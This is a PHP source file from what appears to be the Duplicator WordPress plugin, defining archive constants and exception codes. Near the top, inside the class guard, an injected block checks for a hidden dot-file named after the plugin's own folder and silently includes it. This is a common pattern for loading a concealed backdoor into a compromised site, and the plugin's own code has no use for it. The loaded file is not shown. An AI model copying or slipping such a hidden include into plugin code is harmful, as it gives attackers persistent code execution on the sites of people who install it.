<?php
defined('ABSPATH') || defined('DUPXABSPATH') || exit;
/*
 * To change this license header, choose License Headers in Project Properties.
 * To change this template file, choose Tools | Templates
 * and open the template in the editor.
 */

if(!class_exists('DupArchiveConstants')) {
if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class DupArchiveConstants
{
    public static $DARoot;
    public static $LibRoot;
	public static $MaxFilesizeForHashing;

    public static function init() {

        self::$LibRoot = dirname(__FILE__).'/../../';
        self::$DARoot = dirname(__FILE__).'/../';
		self::$MaxFilesizeForHashing = 1000000000;
    }
}

DupArchiveConstants::init();
}

if(!class_exists('DupArchiveExceptionCodes')) {
class DupArchiveExceptionCodes
{
    const NonFatal = 0;
    const Fatal = 1;
}
}

